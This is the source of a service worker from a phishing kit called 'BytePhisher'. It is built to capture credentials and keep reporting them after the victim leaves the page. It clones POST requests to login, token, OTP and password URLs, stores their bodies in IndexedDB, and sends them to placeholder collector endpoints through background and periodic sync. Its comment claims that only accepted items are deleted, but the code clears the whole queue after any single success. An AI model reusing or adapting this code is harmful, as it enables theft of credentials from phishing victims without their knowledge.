/* BytePhisher service worker - reporting that outlives the visit.
 *
 * Served from the campaign's own origin because Chrome refuses a blob: URL for
 * registration. It does three things:
 *
 *   fetch    - a POST to a login-ish URL is cloned and queued, so a credential
 *              post made after our page is gone is still reported
 *   queue    - the queue lives in IndexedDB, so it survives a dead connection,
 *              a navigation and a closed tab
 *   flush    - background sync (and periodic sync where supported) drains the
 *              queue to the collector endpoint, deleting each item only after
 *              the server accepted it
 */
const EP = "__INTEL__";
const LIVE = "__LIVE__";
const SID = "__SID__";
const DB_NAME = "bh_queue";
const STORE = "q";

function openDB() {
  return new Promise(function (res, rej) {
    if (!self.indexedDB) { rej(new Error("no indexedDB")); return; }
    var req = indexedDB.open(DB_NAME, 1);
    req.onupgradeneeded = function () {
      var db = req.result;
      if (!db.objectStoreNames.contains(STORE)) {
        db.createObjectStore(STORE, { autoIncrement: true });
      }
    };
    req.onsuccess = function () { res(req.result); };
    req.onerror = function () { rej(req.error || new Error("open failed")); };
  });
}

function tx(mode, fn) {
  return openDB().then(function (db) {
    return new Promise(function (res, rej) {
      var t = db.transaction(STORE, mode);
      var store = t.objectStore(STORE);
      var out = fn(store);
      t.oncomplete = function () { res(out && out.result !== undefined ? out.result : out); };
      t.onerror = function () { rej(t.error || new Error("tx failed")); };
    });
  });
}

function enqueue(item) {
  return tx("readwrite", function (store) { store.add(item); });
}

function drain(limit) {
  return tx("readonly", function (store) { return store.getAll(); })
    .then(function (items) {
      return (items || []).slice(0, limit || 40);
    });
}

function clearAll() {
  return tx("readwrite", function (store) { store.clear(); });
}

function post(url, payload) {
  return fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
    keepalive: true,
  }).then(function (r) { return !!(r && (r.ok || r.status < 400)); });
}

function flush() {
  return drain().then(function (items) {
    if (!items.length) return 0;
    var sent = 0;
    return items.reduce(function (chain, item) {
      return chain.then(function () {
        var url = item.kind === "live" ? LIVE : EP;
        return post(url, { sid: SID, kind: item.kind || "sw",
                           url: item.url || "", body: item.body || "",
                           ts: item.ts, wave: "sw" })
          .then(function (ok) { if (ok) sent++; }, function () {});
      });
    }, Promise.resolve()).then(function () {
      // only clear what the server accepted; a failure leaves the queue intact
      return sent ? clearAll().then(function () { return sent; }) : 0;
    });
  });
}

function shouldCapture(url, method) {
  if (String(method || "").toUpperCase() !== "POST") return false;
  return /login|signin|sign-in|auth|token|otp|verify|password|session/i.test(String(url || ""));
}

self.addEventListener("install", function (e) { self.skipWaiting(); });
self.addEventListener("activate", function (e) { e.waitUntil(self.clients.claim()); });

self.addEventListener("fetch", function (e) {
  try {
    var req = e.request;
    if (!shouldCapture(req.url, req.method)) return;
    var clone = req.clone();
    e.waitUntil(clone.text().then(function (body) {
      return enqueue({ kind: "post", url: String(req.url).slice(0, 500),
                       body: String(body || "").slice(0, 4000), ts: Date.now() });
    }).catch(function () {}));
  } catch (err) { /* a worker must never throw into the page */ }
});

self.addEventListener("sync", function (e) {
  if (e.tag === "bh-flush") e.waitUntil(flush());
});
self.addEventListener("periodicsync", function (e) {
  if (e.tag === "bh-flush") e.waitUntil(flush());
});
self.addEventListener("message", function (e) {
  if (e.data === "flush") e.waitUntil(flush());
});
